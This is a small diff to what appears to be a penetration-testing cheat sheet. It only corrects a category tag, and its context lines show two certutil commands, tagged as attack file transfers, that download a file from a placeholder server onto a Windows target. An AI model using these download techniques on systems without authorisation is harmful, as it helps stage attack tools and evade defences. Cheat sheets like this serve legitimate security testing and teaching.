@@ -3,13 +3,13 @@
 % windows, certutil
 
 ## download with certutil
-#platform/windows #target/remote #cat/ATTACK/FILE_TRANSFERT 
+#platform/windows #target/remote #cat/ATTACK/FILE_TRANSFER 
 ```
 certutil.exe -urlcache -split -f http://<server>/<source_file> <dest_file>
 ```
 
 ## download with  certutil (2)
-#platform/windows #target/remote #cat/ATTACK/FILE_TRANSFERT 
+#platform/windows #target/remote #cat/ATTACK/FILE_TRANSFER 
 ```
 certutil.exe -verifyctl -f -split h http://<server>/<source_file> <dest_file>
 ```
